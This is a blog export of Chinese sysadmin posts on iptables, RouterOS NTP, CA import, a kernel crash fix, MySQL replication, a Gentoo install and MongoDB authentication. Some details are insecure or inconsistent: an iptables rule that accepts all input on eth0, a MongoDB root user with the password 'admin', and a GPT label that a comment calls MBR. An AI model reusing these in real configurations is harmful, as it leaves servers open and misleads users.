-Fiptables -Xiptables -Z#允许本地回环iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT#允许已建立链通行iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT #允许Pingiptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPTiptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT#开放SSHiptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#Dockeriptables -A FORWARD -i docker0 -o eth0 -j ACCEPTiptables -A FORWARD -i eth0 -o docker0 -j ACCEPT#开放UDPiptables -A INPUT -p udp --dport 53 -j ACCEPT iptables -A OUTPUT -p udp --sport 53 -j ACCEPT #出去和转发的包默认允许iptables -I INPUT -i eth0 -j ACCEPTiptables -P INPUT DROPiptables -P OUTPUT ACCEPTiptables -P FORWARD ACCEPTiptables-save &gt;/etc/sysconfig/iptablessystemctl restart iptablesiptables -nL 更新防火墙策略 123sh /var/scripts/iptables.sh # 如果需要更新iptables策略，直接更新此脚本即可。","categories":[],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://garywu520.github.io/tags/iptables/"},{"name":"防火墙","slug":"防火墙","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"ACCEPT","slug":"ACCEPT","permalink":"https://garywu520.github.io/tags/ACCEPT/"},{"name":"DROP","slug":"DROP","permalink":"https://garywu520.github.io/tags/DROP/"}]},{"title":"RouterOS时间同步","slug":"RouterOS时间同步","date":"2018-03-09T03:43:56.000Z","updated":"2018-08-09T03:49:34.442Z","comments":true,"path":"2018/03/09/RouterOS时间同步/","link":"","permalink":"https://garywu520.github.io/2018/03/09/RouterOS%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/","excerpt":"","text":"123456配置时区[admin@MikroTik]&gt; &#x2F;system clockset time-zone-autodetect&#x3D;no time-zone-name&#x3D;Asia&#x2F;Hong_Kong[admin@MikroTik]&gt; &#x2F;system clock manualset time-zone&#x3D;+08:00 12345678910111213配置NTP同步服务器[admin@MikroTik]&gt; &#x2F;system ntp clientset enabled&#x3D;yes primary-ntp&#x3D;211.233.84.186 secondary-ntp&#x3D;62.201.225.9查看当前配置和最新时间[admin@MikroTik]&gt; &#x2F;system ntp export NTP服务器参考：Asia — asia.pool.ntp.org server 0.asia.pool.ntp.org server 1.asia.pool.ntp.org server 2.asia.pool.ntp.org server 3.asia.pool.ntp.org","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RouterOS","slug":"RouterOS","permalink":"https://garywu520.github.io/tags/RouterOS/"},{"name":"ROS","slug":"ROS","permalink":"https://garywu520.github.io/tags/ROS/"},{"name":"NTP时间同步","slug":"NTP时间同步","permalink":"https://garywu520.github.io/tags/NTP%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"}]},{"title":"linux导入自签名CA","slug":"linux导入自签名CA","date":"2018-03-01T10:51:20.000Z","updated":"2019-03-01T10:54:28.498Z","comments":true,"path":"2018/03/01/linux导入自签名CA/","link":"","permalink":"https://garywu520.github.io/2018/03/01/linux%E5%AF%BC%E5%85%A5%E8%87%AA%E7%AD%BE%E5%90%8DCA/","excerpt":"","text":"CentOS导入CA12345(1) yum install -y ca-certificates(2)上传根证书到&#x2F;etc&#x2F;pki&#x2F;ca-trust&#x2F;source&#x2F;anchors目录中(3) 最后执行：update-ca-trust 注意事项 123如果根证书是以*.pem结尾，需要转换成crt，然后再执行上述步骤。命令如下：openssl x509 -in ca.pem -inform PEM -out ca.crt","categories":[],"tags":[{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"},{"name":"ca","slug":"ca","permalink":"https://garywu520.github.io/tags/ca/"},{"name":"证书导入","slug":"证书导入","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6%E5%AF%BC%E5%85%A5/"},{"name":"证书信任","slug":"证书信任","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6%E4%BF%A1%E4%BB%BB/"},{"name":"自签名证书","slug":"自签名证书","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6/"}]},{"title":"记一次线上服务器频繁宕机","slug":"记一次线上服务器频繁宕机","date":"2018-02-27T09:06:20.000Z","updated":"2018-02-27T09:15:13.072Z","comments":true,"path":"2018/02/27/记一次线上服务器频繁宕机/","link":"","permalink":"https://garywu520.github.io/2018/02/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8A%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%A2%91%E7%B9%81%E5%AE%95%E6%9C%BA/","excerpt":"message日志如下：12kernel: ERST: Error Record Serialization Table (ERST) support is initialized.kernel: ACPI: No handler for Region [IPMI] (ffff880e76fc9468) [IPMI]","text":"message日志如下：12kernel: ERST: Error Record Serialization Table (ERST) support is initialized.kernel: ACPI: No handler for Region [IPMI] (ffff880e76fc9468) [IPMI] dmesg日志如下：12dmar: Device scope device [0000:00:1a.02] not founddmar: Device scope device [0000:00:1d.02] not found 故障分析:1由于BIOS中开启了中断重映射（这是个复杂的东西。），在ERST(芯片集中的错误校验表)校验时发生错误，导致高级配置电源管理模块无法处理IPMI驱动请求，预存数据到内存发生错误，引发kernel找到空指针。 解决方法:123456789在grub.conf的内核启动参数中添加 intremap&#x3D;off 或者 intremap&#x3D;no_x2apic_optout参数含义:intremap&#x3D;&#123;on,off,nosid,no_x2apic_optout&#125; on(默认值)开启中断重映射,BIOS中默认开启 off 关闭中断重映射 nosid 重映射时不对SID(Source ID)做检查 no_x2apic_optout 无视BIOS的设置，强制禁用x2APIC特性，主要用于解决某些对x2APIC支持有缺陷的BIOS导致的故障 参考:51CTO","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Kernel","slug":"Kernel","permalink":"https://garywu520.github.io/tags/Kernel/"},{"name":"ACPI Error","slug":"ACPI-Error","permalink":"https://garywu520.github.io/tags/ACPI-Error/"},{"name":"no hander","slug":"no-hander","permalink":"https://garywu520.github.io/tags/no-hander/"}]},{"title":"mysql主从复制错误-错误号1236","slug":"mysql主从复制错误-错误号1236","date":"2018-02-26T09:29:43.000Z","updated":"2018-02-26T09:52:29.054Z","comments":true,"path":"2018/02/26/mysql主从复制错误-错误号1236/","link":"","permalink":"https://garywu520.github.io/2018/02/26/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E9%94%99%E8%AF%AF-%E9%94%99%E8%AF%AF%E5%8F%B71236/","excerpt":"1当新增从库后,主从同步出现错误（错误号1236）,一般都能通过以下方法处理: 12345如果此时出现1236错误，在主库查看mysql-bin.003394这个binlog的position号这里是36035408，然后从库进行如下操作stop slave;change master to master_log_file&#x3D;&#39;mysql-bin.003394&#39;,master_log_pos&#x3D;36035408;start slave;show slave status\\G","text":"1当新增从库后,主从同步出现错误（错误号1236）,一般都能通过以下方法处理: 12345如果此时出现1236错误，在主库查看mysql-bin.003394这个binlog的position号这里是36035408，然后从库进行如下操作stop slave;change master to master_log_file&#x3D;&#39;mysql-bin.003394&#39;,master_log_pos&#x3D;36035408;start slave;show slave status\\G 现在来说下极端情况,监控不到位，从库SQL线程出现错误卡了半个月了，如何处理？ 12341. 从库进入data数据目录,查看relay-log.info里面的mysql-bin.00xxxx文件和position号来确认从库执行到了哪个地方。2. 主库上面通过show master logs;命令确认刚刚从库执行过的mysql-bin.00xxxx这个binlog文件是否仍然存在。3. 主库如果存在,从库使用“relay-log.info里面的mysql-bin.00xxxx文件和position号”重新执行change master to4. 主库如果不存在或者说主库仅保留了近期几天的binlog,那么恭喜你,重新部署主从。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"1236","slug":"1236","permalink":"https://garywu520.github.io/tags/1236/"},{"name":"主从复制错误","slug":"主从复制错误","permalink":"https://garywu520.github.io/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E9%94%99%E8%AF%AF/"}]},{"title":"Linux之Gentoo编译安装","slug":"Linux之Gentoo编译安装","date":"2018-02-24T08:53:57.000Z","updated":"2018-02-27T10:50:25.002Z","comments":true,"path":"2018/02/24/Linux之Gentoo编译安装/","link":"","permalink":"https://garywu520.github.io/2018/02/24/Linux%E4%B9%8BGentoo%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/","excerpt":"123前段时间搞过一次Gentoo，最终以失败告终,新年开工正好有时间卷土重来。配置过程相当复杂，需要很强的耐心，但整个过程下来后，会学到很多东西。 官方文档: Gentoo AMD64手册","text":"123前段时间搞过一次Gentoo，最终以失败告终,新年开工正好有时间卷土重来。配置过程相当复杂，需要很强的耐心，但整个过程下来后，会学到很多东西。 官方文档: Gentoo AMD64手册 准备工作下载minimal镜像12官方镜像地址：http:&#x2F;&#x2F;distfiles.gentoo.org&#x2F;releases&#x2F;网易镜像地址：http:&#x2F;&#x2F;mirrors.163.com&#x2F;gentoo&#x2F;releases&#x2F; 12345678910截止目前最新的是install-amd64-minimal-20180222T214502Z.isominimal镜像和stage3下载地址：http:&#x2F;&#x2F;mirrors.163.com&#x2F;gentoo&#x2F;releases&#x2F;amd64&#x2F;autobuilds&#x2F;current-stage3-amd64&#x2F;portage下载地址: http:&#x2F;&#x2F;mirrors.163.com&#x2F;gentoo&#x2F;releases&#x2F;snapshots&#x2F;current&#x2F;portage-20180220.tar.bz2 注：如果网络较好可以通过网络下载stage3和portage。如果提前下载需要拷贝到U盘里，需要的时候挂载解压。我这边网络比较好，选择在安装的过程中从网上下载。 制作引导U盘1把iso刻录到U盘里，用来启动引导，这里推荐使用UltraISO，启动-&gt;写入硬盘镜像 记录服务器硬件配置1因为在安装的过程中要自己编译内核，需要配置一些硬件驱动信息，主要是CPU、显卡、网卡，可以自行查看，配置选好的话可以节省很多编译时间和内核资源。 安装基本系统1从U盘启动，在boot处输入: gentoo dopcmcia ,根据引导进入命令行模式,接下来安装基本系统。 分区1234567建议分区规划bios_grub BIOS启动分区，官方是2M,我这里给9M boot 300M 启动系统目录,挂载目录: &#x2F;mnt&#x2F;gentoo&#x2F;bootswap 8192M &#x2F; 剩余All 挂载目录: &#x2F;mnt&#x2F;gentoo注：系统使用BIOS引导方式,所以不需要EFI分区 123456789101112131415161718192021222324252627282930分区格式（MBR或GPT）直接影响到后边的GRUB引导,本例是MBR分区（BIOS引导方式）livecd # partedselect &#x2F;dev&#x2F;sda #选择操作的磁盘mklabel gpt #分区格式使用MBRmkpart primary 1M 10M #BIOS启动分区必须有,否则grub安装出错name 1 grubset 1 bios_grub on #设置BIOS分区可启动mkpart primary 10M 310M #boot系统分区name 2 bootset 2 boot on #设置boot分区为可启动mkpart primary 310M 8502M #swap分区name 3 swapmkpart primary 8502M -1 #剩余全部给根分区name 4 bootfsp 查看分区quit 退出parted----------------------------------------------格式化mkfs.ext2 &#x2F;dev&#x2F;sda1 格式化预留空间分区mkfs.ext2 &#x2F;dev&#x2F;sda2 格式化boot分区mkswap &#x2F;dev&#x2F;sda3 格式化swap分区mkfs.ext4 &#x2F;dev&#x2F;sda4 格式化根分区----------------------------------------------挂载到&#x2F;mnt&#x2F;下mount &#x2F;dev&#x2F;sda4 &#x2F;mnt&#x2F;gentoo 先挂载根分区mkdir -p &#x2F;mnt&#x2F;gentoo&#x2F;boot 创建boot挂载目录mount &#x2F;dev&#x2F;sda2 &#x2F;mnt&#x2F;gentoo&#x2F;boot 挂载bootswapon &#x2F;dev&#x2F;sda3 挂载swap 123456分区相关-知识点总结:(1)如果是MBR分区的磁盘，使用以下方法创建ESP：parted创建的boot_grub和boot分区, 使用mkfs.ext2格式化-----------------------------------------------------------------------------------------------(2)关于parted set命令的flag类型,可参考官方文档: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;parted&#x2F;manual&#x2F;html_node&#x2F;set.html 配置网络1234567配置网络主要是用来下载portage和stage,如果已经下载到U盘里,直接挂载U盘拷贝到&#x2F;mnt&#x2F;gentoo&#x2F;os目录下。使用如下命令来配置网络:ifconfig 查看网络标识net-setup eno16777728 根据提示输入IP地址、broadcast、netmask、gateway、DNS和dns search suffix地址(如:qq.com)使用ping qq.com来测试网络是否可用官方网络配置参考：https:&#x2F;&#x2F;wiki.gentoo.org&#x2F;wiki&#x2F;Handbook:X86&#x2F;Installation&#x2F;Networking#Manual_network_configuration 12345开启ssh，配置后边的东西会方便很多，比如:命令粘贴或文件粘贴&#x2F;etc&#x2F;init.d&#x2F;sshd start #启动ssh服务passwd root #修改root密码此时就可以使用xshell连接了 12345678使用links命令把portage和stage下载到&#x2F;mnt&#x2F;gentoo里cd &#x2F;mnt&#x2F;gentoo&#x2F; #切换到挂载的根分区下载包(只有这个有大空间)links mirrors.163.com&#x2F;gentoo注: stage在releases&#x2F;x86&#x2F;current-iso&#x2F;目录下; portage在snapshots&#x2F;目录下#解压(按照下面顺序解压)xz -d stage3-amd64-20180225T214502Z.tar.xz &amp;&amp; tar -xf stage3-amd64-20180225T214502Z.tar tar -xjf portage-20180220.tar.bz2 -C &#x2F;mnt&#x2F;gentoo&#x2F;usr&#x2F; 配置make.conf12为了优化Gentoo，必须在软件编译的时候指定某些参数，这样编译出来的程序运行效率将非常高，系统在编译用到的参数就在make.conf里，文件路径是&#x2F;mnt&#x2F;gentoo&#x2F;etc&#x2F;portage&#x2F;make.conf.Gentoo给了我们一个配置的sample在&#x2F;mnt&#x2F;gentoo&#x2F;usr&#x2F;share&#x2F;portage&#x2F;config&#x2F;make.conf.example，他里面讲的很详细，下面的是我的make.conf。 1234567891011vi &#x2F;mnt&#x2F;gentoo&#x2F;etc&#x2F;portage&#x2F;make.conf#USE用于控制软件的安装USE&#x3D;&quot;bindist mmx sse sse2&quot; #这两个变量使用相同的值,这两个变量定义gcc和c++编译器的优化CFLAGS&#x3D;&quot;-march&#x3D;native -mtune&#x3D;native -O2 -pipe&quot; CXXFLAGS&#x3D;&quot;$&#123;CFLAGS&#125;&quot; #指定gcc同时编译的数量,一般是CPU个数(或核心数）+1MAKEOPTS&#x3D;&quot;-j9&quot; 注:&quot;-march&#x3D;native&quot;参数,native意思是让系统自动检测cpu型号进行配置 进入新环境1234567接下来就可以进入新环境&#x2F;mnt&#x2F;gentoo, 在chroot进入新环境前需要做一些设备的挂载和DNS文件复制cp -L &#x2F;etc&#x2F;resolv.conf &#x2F;mnt&#x2F;gentoo&#x2F;etc&#x2F;mount -t proc none &#x2F;mnt&#x2F;gentoo&#x2F;proc mount --rbind &#x2F;sys &#x2F;mnt&#x2F;gentoo&#x2F;sysmount --make-rslave &#x2F;mnt&#x2F;gentoo&#x2F;sysmount --rbind &#x2F;dev &#x2F;mnt&#x2F;gentoo&#x2F;devmount --make-rslave &#x2F;mnt&#x2F;gentoo&#x2F;dev 12345678使用chroot进入新环境,并更新环境变量chroot &#x2F;mnt&#x2F;gentoo &#x2F;bin&#x2F;bashenv-updatesource &#x2F;etc&#x2F;profile为了使portage里的软件保持最新，最好同步一下emerge --sync 注:如果同步出错，需要检查&#x2F;etc&#x2F;portage&#x2F;make.conf文件中的参数 1234567891011Gentoo中除了USE和CFLAGS用于优化外还有一个重要的profile，这个是Gentoo自带的配置文件，我们只要选择合适的就行了。eselect profile list #列出所有的子版本(带*号的是默认选项) [1] default&#x2F;linux&#x2F;amd64&#x2F;13.0 (stable)* [2] default&#x2F;linux&#x2F;amd64&#x2F;13.0&#x2F;selinux (dev) [3] default&#x2F;linux&#x2F;amd64&#x2F;13.0&#x2F;desktop (stable) [4] default&#x2F;linux&#x2F;amd64&#x2F;13.0&#x2F;desktop&#x2F;gnome (stable) [5] default&#x2F;linux&#x2F;amd64&#x2F;13.0&#x2F;desktop&#x2F;gnome&#x2F;systemd (stable) ...... eselect profile set 12 #选择对应版本 编译内核12345678910111213141516选择一个内核并进行安装emerge --ask sys-kernel&#x2F;gentoo-sources进入内核源码cd &#x2F;usr&#x2F;src&#x2F;linux手动配置内核make menuconfig注：make menuconfig显示错误“Your display is too small to run Menuconfig!”如果在终端执行 make menuconfig ,显示错误：Your display is too small to run Menuconfig!It must be at least 19 lines by 80 columns.make[1]: *** [menuconfig] Error 1make: *** [menuconfig] Error 2表示xshell终端窗口太小。把终端窗口适当的调大（或是直接最大化）就行了。 1注：内核的配置可以参考官方文档:https:&#x2F;&#x2F;wiki.gentoo.org&#x2F;wiki&#x2F;Handbook:X86&#x2F;Installation&#x2F;Kernel 内核:启用devtmpfs支持123456作用：用来挂载&#x2F;dev,以便在启动过程中使用关键设备文件Device Drivers ---&gt; Generic Driver Options ---&gt; [*] Maintain a devtmpfs filesystem to mount at &#x2F;dev [*] Automount devtmpfs at &#x2F;dev, after the kernel mounted the rootfs 内核: 启用SCSI磁盘支持123Device Drivers ---&gt; SCSI device support ---&gt; &lt;*&gt; SCSI disk support 内核: 选择必要的文件系统123456789101112建议常用的文件系统格式都选择上，免得用的时候抓瞎File systems ---&gt; &lt;*&gt; Second extended fs support &lt;*&gt; The Extended 3 (ext3) filesystem &lt;*&gt; The Extended 4 (ext4) filesystem &lt;*&gt; Reiserfs support &lt;*&gt; JFS filesystem support &lt;*&gt; XFS filesystem support &lt;*&gt; Btrfs filesystem support DOS&#x2F;FAT&#x2F;NT Filesystems ---&gt; &lt;*&gt; MSDOS fs support &lt;*&gt; VFAT (Windows-95) fs support 内核: 选择PPPoE必要的驱动程序12345Device Drivers ---&gt; Network device support ---&gt; &lt;*&gt; PPP (point-to-point protocol) support &lt;*&gt; PPP support for async serial ports &lt;*&gt; PPP support for sync tty ports 内核: 激活SMP支持1234作用：用于支持多内核存在,用来在多个内核间进行切换Processor type and features ---&gt; [*] Symmetric multi-processing support 内核: 启用输入设备的USB支持 1234567891011Device Drivers ---&gt; HID support ---&gt; -*- HID bus support &lt;*&gt; Generic HID driver [*] Battery level reporting for HID devices USB HID support ---&gt; &lt;*&gt; USB HID transport layer [*] USB support ---&gt; &lt;*&gt; xHCI HCD (USB 3.0) support &lt;*&gt; EHCI HCD (USB 2.0) support &lt;*&gt; OHCI HCD (USB 1.1) support 内核: 选择处理器类型和特点123456789101112Processor type and features ---&gt; [ ] Machine Check &#x2F; overheating reporting [ ] Intel MCE Features [ ] AMD MCE Features Processor family (AMD-Opteron&#x2F;Athlon64) ---&gt; ( ) Opteron&#x2F;Athlon64&#x2F;Hammer&#x2F;K8 ( ) Intel P4 &#x2F; older Netburst based Xeon ( ) Core 2&#x2F;newer Xeon ( ) Intel Atom ( ) Generic-x86-64Executable file formats &#x2F; Emulations ---&gt; [*] IA32 Emulation 内核: 启用对GPT的支持(用于支持GPT分区)1234-*- Enable the block layer ---&gt; Partition Types ---&gt; [*] Advanced partition selection [*] EFI GUID Partition support 内核: 启用对UEFI方式引导系统的支持12345678910注:如果不启用,则系统不能通过UEFI方式引导Processor type and features ---&gt; [*] EFI runtime service support [*] EFI stub support [*] EFI mixed-mode support Firmware Drivers ---&gt; EFI (Extensible Firmware Interface) Support ---&gt; &lt;*&gt; EFI Variable Support via sysfs 12345编译并安装模块make &amp;&amp; make modules_install内核编译完成后，使用如下命令将内核镜像复制到&#x2F;boot&#x2F;目录中make install 配置系统1emerge app-editors&#x2F;vim #安装vim 配置fstab123456vim &#x2F;etc&#x2F;fstab&#x2F;dev&#x2F;sda4 &#x2F; ext4 defaults 1 1 #配置挂载根分区&#x2F;dev&#x2F;sda3 none swap sw 0 0 #配置挂载swap&#x2F;dev&#x2F;sda2 &#x2F;boot ext2 noauto,noatime 1 2 #配置挂载boot分区注: 生产环境下,最前面的&#x2F;dev&#x2F;sda1、sda2、sda3要通过blkid命令替换成对应的UUID 配置主机名 123vim &#x2F;etc&#x2F;conf.d&#x2F;hostnamehostname &#x3D;“gentoo” ＃将主机名变量设置为所选主机名 配置网络12345678910这次是配置的系统网络，而非LiveCD的网络emerge --ask --noreplace net-misc&#x2F;netifrcvi &#x2F;etc&#x2F;conf.d&#x2F;net #配置静态IPconfig_eth0&#x3D;&quot;10.0.10.100 netmask 255.255.255.0 brd 10.0.10.255&quot;routes_eth0&#x3D;&quot;default via 10.0.10.1&quot;注：如果系统自动获取IP则进行如下配置config_eth0&#x3D;&quot;dhcp&quot; 系统启动时激活网卡配置123cd &#x2F;etc&#x2F;init.dln -s net.lo net.eth0rc-update add net.eth0 default 1234567排错如果在启动系统后，我们发现有关网络接口名称（目前记录为eth0）的假设是错误的，那么执行以下步骤来解决这个问题：使用正确的接口名称更新&#x2F;etc&#x2F;conf.d&#x2F;net文件（enp3s0而不是eth0）。创建新的符号链接（如&#x2F;etc&#x2F;init.d&#x2F;net.enp3s0）。删除旧的符号链接（rm &#x2F;etc&#x2F;init.d&#x2F;net.eth0）。将新的添加到默认运行级别。使用rc-update del net.eth0默认值删除旧的。 定义hosts文件12vim &#x2F;etc&#x2F;hosts127.0.0.1 gentoo.homenetwork gentoo localhost ＃这定义了当前系统并且必须设置 系统信息1使用passwd命令设置root密码。 配置rc.conf文件 123作用: Gentoo使用&#x2F;etc&#x2F;rc.conf来配置系统的服务，启动和关闭。打开&#x2F;etc&#x2F;rc.conf并享受文件中的所有注释。查看设置并在需要的地方进行更改。 中文语言支持1234567vim &#x2F;etc&#x2F;locale.genen_US ISO-8859-1en_US.UTF-8 UTF-8#把需要的项前面的#号去掉执行locale-gen 修改时区12345cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtimeecho &quot;Asia&#x2F;Shanghai&quot; &gt; &#x2F;etc&#x2F;timezone#设置硬件时间为本地，不然会多8个小时hwclock -w --localtime 安装系统日志记录器123作用：提供传统的系统日志守护进程emerge --ask app-admin&#x2F;sysklogd rc-update add sysklogd default 安装crond定时任务123456作用：cron守护进程执行预定的命令。如果需要定期执行某些命令（例如每天，每周或每月），这非常方便。emerge --ask sys-process&#x2F;cronierc-update add cronie default如果使用dcron或fcron，则需要执行额外的初始化命令：crontab &#x2F;etc&#x2F;crontab 远程访问1rc-update add sshd default #添加ssh开机自启动 文件索引12作用：为了索引文件系统以提供更快的文件位置功能emerge --ask sys-apps&#x2F;mlocate 文件系统工具12345678作用: 用于检查文件系统完整性，创建其他文件系统等,按需安装emerge sys-fs&#x2F;e2fsprogs 用于管理Ext2, Ext3, EXT4emerge sys-fs&#x2F;xfsprogs 用于管理XFSemerge sys-fs&#x2F;reiserfsprogs 用于管理ReiserFSemerge sys-fs&#x2F;jfsutils 用于管理JFSemerge sys-fs&#x2F;dosfstools 用于管理VFAT（如：FAT32、NTFS等）emerge sys-fs&#x2F;btrfs-progs 用于管理Btrfs 配置GRUB引导12345678910111213141516(1)修改vim &#x2F;etc&#x2F;portage&#x2F;make.conf添加：# Both UEFI and PCGRUB_PLATFORMS&#x3D;&quot;efi-64 pc&quot;(2)MBR分区-BIOS方式引导emerge --ask sys-boot&#x2F;grub:2(3)安装到MBR。假定第一个（系统引导的）磁盘是&#x2F;dev&#x2F;sdagrub-install &#x2F;dev&#x2F;sda(4)自动生成grub2配置grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg (5)保险起见再次执行一次这个命令 grub-install &#x2F;dev&#x2F;sda 现在基本系统安装完成，卸载分区，重启。123456exitumount -l &#x2F;mnt&#x2F;gentoo&#x2F;devumount -l &#x2F;mnt&#x2F;gentoo&#x2F;procumount -l &#x2F;mnt&#x2F;gentoo&#x2F;sysumount -l &#x2F;mnt&#x2F;gentooreboot 故障处理1Grub引导正常，但启动系统过程中,出现 LFS kernel panic -not syncing :VFS:Unable to mount root fs on Unknown-block(0,0) 12345原因：(1)进入LiveCD，挂载根和boot分区,然后修改修改&#x2F;etc&#x2F;fstab文件注:一律使用uuid替代&#x2F;dev&#x2F;sdx(2)内核编译的时候没有添加相应的硬件模块,建议只增不减。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"},{"name":"Gentoo","slug":"Gentoo","permalink":"https://garywu520.github.io/tags/Gentoo/"},{"name":"Kernel","slug":"Kernel","permalink":"https://garywu520.github.io/tags/Kernel/"},{"name":"内核编译","slug":"内核编译","permalink":"https://garywu520.github.io/tags/%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"}]},{"title":"MongoDB之用户授权管理","slug":"MongoDB之用户授权管理","date":"2018-02-23T01:57:00.000Z","updated":"2018-02-23T03:08:09.038Z","comments":true,"path":"2018/02/23/MongoDB之用户授权管理/","link":"","permalink":"https://garywu520.github.io/2018/02/23/MongoDB%E4%B9%8B%E7%94%A8%E6%88%B7%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86/","excerpt":"1Mongo默认没有启用用户授权机制,连接没有使用账号密码，为了安全，加上更佳安全 目前连接mongo方式12345mongo --port 27001 #连接本地的数据库mongo 10.0.10.25:27017 #连接远程mongo如果做了高可用,可能需要远程连接Router路由(即mongos)mongo 10.0.10.25:20000","text":"1Mongo默认没有启用用户授权机制,连接没有使用账号密码，为了安全，加上更佳安全 目前连接mongo方式12345mongo --port 27001 #连接本地的数据库mongo 10.0.10.25:27017 #连接远程mongo如果做了高可用,可能需要远程连接Router路由(即mongos)mongo 10.0.10.25:20000 MongoDB用户管理在admin库添加超级用户1234567891011121314151617查看当前数据库mongos&gt; show dbs 切换到admin数据库（没有则创建）mongos&gt; use admin添加管理员账户mongos&gt; db.createUser( &#123; user: &quot;admin&quot;, pwd: &quot;admin&quot;, roles: [ &#123; role: &quot;root&quot;, db: &quot;admin&quot; &#125; ] &#125; ) 12注： 最高权限需使用root, 而userAdminAnyDatabase只有用户管理权限，非最高权限。roles 中的 db 参数是必须的，不然会报错：Error: couldn’t add user: Missing expected field “db”。 验证刚创建的超级用户123show users或db.system.users.find() 停止服务并重新运行mongo服务12345678910111213怎么关闭 mongoDB？建议使用supervisor优雅重启。千万不要 kill -9 pid其他2种方法kill -2 pid 或 use admindb.shutdownServer()修改Mongo配置文件添加如下参数：auth&#x3D;true重新启动 mongoDB&#x2F;mongod -f &#x2F;data&#x2F;A&#x2F;mongodb&#x2F;conf&#x2F;shard1.conf 认证测试1234567这样客户端连接数据库，对数据库进行各种操作就需要授权了。可用如下命令：use admindb.auth(&#39;admin&#39;,&#39;admin&#39;)成功会返回1。或者在连接时mongo 192.168.11.6:27017 -u admin -p --authenticationDatabase admin","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Mongo","slug":"Mongo","permalink":"https://garywu520.github.io/tags/Mongo/"},{"name":"Mongodb","slug":"Mongodb","permalink":"https://garywu520.github.io/tags/Mongodb/"},{"name":"用户管理","slug":"用户管理","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"},{"name":"授权管理","slug":"授权管理","permalink":"https://garywu520.github.io/tags/%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86/"}]},{"title":"MongoDB之数据库管理","slug":"MongoDB之数据库管理","date":"2018-02-23T01:49:57.000Z","updated":"2018-02-23T05:13:37.226Z","comments":true,"path":"2018/02/23/MongoDB之数据库管理/","link":"","permalink":"https://garywu520.github.io/2018/02/23/MongoDB%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86/","excerpt":"查看服务器运行状态查看服务器状态1mongos&gt; db.serverStatus()","text":"查看服务器运行状态查看服务器状态1mongos&gt; db.serverStatus() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&#123; &quot;host&quot; : &quot;bogon:20000&quot;, &quot;version&quot; : &quot;3.4.6&quot;, &quot;process&quot; : &quot;mongos&quot;, &quot;pid&quot; : NumberLong(4209), &quot;uptime&quot; : 2501, &quot;uptimeMillis&quot; : NumberLong(2500907), &quot;uptimeEstimate&quot; : NumberLong(2500), &quot;localTime&quot; : ISODate(&quot;2018-02-23T03:22:23.794Z&quot;), &quot;asserts&quot; : &#123; &quot;regular&quot; : 0, &quot;warning&quot; : 0, &quot;msg&quot; : 0, &quot;user&quot; : 3, &quot;rollovers&quot; : 0 &#125;, &quot;connections&quot; : &#123; &quot;current&quot; : 1, &quot;available&quot; : 818, &quot;totalCreated&quot; : 4 &#125;, &quot;network&quot; : &#123; &quot;bytesIn&quot; : NumberLong(8630), &quot;bytesOut&quot; : NumberLong(23644), &quot;physicalBytesIn&quot; : NumberLong(8630), &quot;physicalBytesOut&quot; : NumberLong(23644), &quot;numRequests&quot; : NumberLong(183) &#125;, &quot;sharding&quot; : &#123; &quot;configsvrConnectionString&quot; : &quot;configs&#x2F;10.0.10.25:21000,10.0.10.26:21000,10.0.10.27:21000&quot;, &quot;lastSeenConfigServerOpTime&quot; : &#123; &quot;ts&quot; : Timestamp(1519356136, 2), &quot;t&quot; : NumberLong(3) &#125; &#125;, &quot;tcmalloc&quot; : &#123; &quot;generic&quot; : &#123; &quot;current_allocated_bytes&quot; : 2584560, &quot;heap_size&quot; : 4194304 &#125;, &quot;tcmalloc&quot; : &#123; &quot;pageheap_free_bytes&quot; : 311296, 